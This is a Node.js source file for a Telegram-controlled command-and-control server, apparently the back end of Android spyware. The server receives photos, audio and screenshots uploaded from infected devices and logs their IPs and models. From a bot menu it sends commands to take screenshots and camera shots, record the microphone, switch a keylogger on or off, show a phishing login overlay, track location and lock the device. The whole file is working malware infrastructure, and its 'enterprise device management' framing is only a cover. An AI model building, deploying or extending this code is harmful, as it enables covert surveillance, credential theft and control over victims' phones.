const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

let botToken = process.env.TELEGRAM_TOKEN || 'YOUR_BOT_TOKEN';
let adminChatId = process.env.CHAT_ID || 'YOUR_CHAT_ID';

try {
    if (fs.existsSync('./data.json')) {
        const rawData = fs.readFileSync('./data.json', 'utf8');
        const parsed = JSON.parse(rawData);
        if (parsed.token) botToken = parsed.token;
        if (parsed.id) adminChatId = parsed.id;
    }
} catch (e) {
    console.log('No data.json found, using environment variables.');
}

const bot = new TelegramBot(botToken, { polling: true });
const appData = new Map();

// File upload endpoint for Android app (photos, audio, screenshots)
app.post('/upload', uploader.single('file'), (req, res) => {
    const file = req.file;
    const deviceId = req.headers['device-id'] || 'Unknown Device';
    if (file) {
        bot.sendDocument(adminChatId, file.buffer, {
            caption: `<b>📁 File received from → ${deviceId}</b>`,
            parse_mode: 'HTML'
        }, {
            filename: file.originalname,
            contentType: file.mimetype
        });
    }
    res.send('Done');
});

// Socket.io connection for Android devices
io.on('connection', (socket) => {
    const deviceId = socket.handshake.headers['device-id'] || socket.id;
    const model = socket.handshake.query.model || 'Unknown Model';
    const ip = socket.handshake.address || 'Unknown IP';

    socket.deviceId = deviceId;
    socket.model = model;

    const connectMsg = `<b>✯ New device connected</b>\n\n<b>Device →</b> \`${deviceId}\`\n<b>Model →</b> ${model}\n<b>IP →</b> ${ip}\n`;
    bot.sendMessage(adminChatId, connectMsg, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        const disconnectMsg = `<b>✯ Device disconnected</b>\n\n<b>Device →</b> \`${deviceId}\`\n<b>Model →</b> ${model}\n`;
        bot.sendMessage(adminChatId, disconnectMsg, { parse_mode: 'HTML' });
    });

    socket.on('response', (res) => {
        bot.sendMessage(adminChatId, `<b>✯ Response from → \`${deviceId}\`</b>\n\n<pre>${JSON.stringify(res, null, 2)}</pre>`, { parse_mode: 'HTML' });
    });
});

// Telegram Bot Command & Interactive Menu Handler
bot.on('message', (msg) => {
    const chatId = msg.chat.id.toString();
    const text = msg.text ? msg.text.trim() : '';

    if (text === '/start') {
        bot.sendMessage(chatId, `<b>✯ Welcome to Enterprise Telegram C2 ✯</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ Devices ✯', '✯ Actions ✯'],
                    ['✯ About us ✯']
                ],
                resize_keyboard: true
            }
        });
    } else if (text === '✯ Devices ✯') {
        const sockets = io.sockets.sockets;
        if (sockets.size === 0) {
            bot.sendMessage(chatId, `<b>✯ There is no connected device ✯</b>`, { parse_mode: 'HTML' });
        } else {
            let msgText = `<b>✯ Connected devices count : ${sockets.size} ✯</b>\n\n`;
            let idx = 1;
            sockets.forEach((socket) => {
                msgText += `<b>${idx}</b>\n<b>Device ID →</b> \`${socket.deviceId}\`\n<b>Model →</b> ${socket.model}\n<b>IP →</b> ${socket.handshake.address}\n\n`;
                idx++;
            });
            bot.sendMessage(chatId, msgText, { parse_mode: 'HTML' });
        }
    } else if (text === '✯ Actions ✯') {
        const sockets = io.sockets.sockets;
        if (sockets.size === 0) {
            bot.sendMessage(chatId, `<b>✯ There is no connected device ✯</b>`, { parse_mode: 'HTML' });
        } else {
            const keyboard = [];
            sockets.forEach((socket) => {
                keyboard.push([socket.deviceId]);
            });
            keyboard.push(['✯ All ✯'], ['✯ Cancel action ✯']);
            bot.sendMessage(chatId, `<b>✯ Select device to perform action ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: keyboard,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    } else if (text === '✯ Cancel action ✯' || text === '✯ Back to main menu ✯') {
        bot.sendMessage(chatId, `<b>✯ Main menu ✯</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ Devices ✯', '✯ Actions ✯'],
                    ['✯ About us ✯']
                ],
                resize_keyboard: true
            }
        });
    } else if (text === '✯ About us ✯') {
        bot.sendMessage(chatId, `<b>✯ Enterprise Device Management C2 ✯</b>\nDeveloped for secure remote telemetry and command control.`, { parse_mode: 'HTML' });
    } else {
        // Check if selected text is a device ID
        let targetSocket = null;
        io.sockets.sockets.forEach((socket) => {
            if (socket.deviceId === text) {
                targetSocket = socket;
            }
        });

        if (targetSocket) {
            appData.set('currentTarget', targetSocket.id);
            bot.sendMessage(chatId, `<b>✯ Selected Device: \`${text}\` ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ Screenshot ✯', '✯ Front Camera ✯'],
                        ['✯ Microphone ✯', '✯ Vibrate ✯'],
                        ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                        ['✯ Phishing Overlay ✯', '✯ Location ✯'],
                        ['✯ Lock Device ✯', '✯ Siren ✯'],
                        ['✯ Back to main menu ✯']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else {
            const targetId = appData.get('currentTarget');
            if (targetId) {
                let requestName = '';
                let extras = [];

                if (text === '✯ Screenshot ✯') requestName = 'take_screenshot';
                else if (text === '✯ Front Camera ✯') requestName = 'take_photo';
                else if (text === '✯ Microphone ✯') { requestName = 'microphone'; extras = [{ key: 'duration', value: 10 }]; }
                else if (text === '✯ Vibrate ✯') { requestName = 'vibrate'; extras = [{ key: 'duration', value: 5 }]; }
                else if (text === '✯ Keylogger ON ✯') requestName = 'keylogger-on';
                else if (text === '✯ Keylogger OFF ✯') requestName = 'keylogger-off';
                else if (text === '✯ Phishing Overlay ✯') requestName = 'show_login_overlay';
                else if (text === '✯ Location ✯') requestName = 'sync_location';
                else if (text === '✯ Lock Device ✯') requestName = 'lock_device';
                else if (text === '✯ Siren ✯') requestName = 'start_siren';

                if (requestName) {
                    io.to(targetId).emit('commend', { request: requestName, extras: extras });
                    bot.sendMessage(chatId, `<b>✯ Command sent: \`${requestName}\` ✯</b>`, { parse_mode: 'HTML' });
                }
            } else {
                bot.sendMessage(chatId, `<b>⚠️ Please select a device first from '✯ Actions ✯'.</b>`, { parse_mode: 'HTML' });
            }
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Telegram Bot C2 Server listening on port ${PORT}`);
});
